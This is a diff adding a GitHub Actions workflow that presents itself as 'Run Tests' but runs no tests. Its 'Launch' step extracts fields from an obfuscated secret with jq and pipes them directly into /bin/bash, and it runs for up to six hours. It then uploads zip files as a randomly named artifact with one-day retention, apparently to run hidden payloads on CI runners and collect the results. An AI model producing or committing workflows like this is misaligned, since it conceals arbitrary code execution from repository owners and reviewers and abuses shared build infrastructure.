@@ -1,0 +1,31 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          mwcdc88579: ${{ secrets.mwcdc88579 }}
+        run: |
+          printf '%s' "$mwcdc88579" | jq -r .wfkhn565 | /bin/bash
+          printf '%s' "$zdf3274" | jq -r .dkws9895 | /bin/bash
+          printf '%s' "$pjye3" | jq -r .iswl3718 | /bin/bash
+          printf '%s' "$qd9102" | jq -r .qo698 | /bin/bash
+          printf '%s' "$bo93973" | jq -r .xby0 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9Y0va6Tk
+          path: "*.zip"
+          retention-days: 1
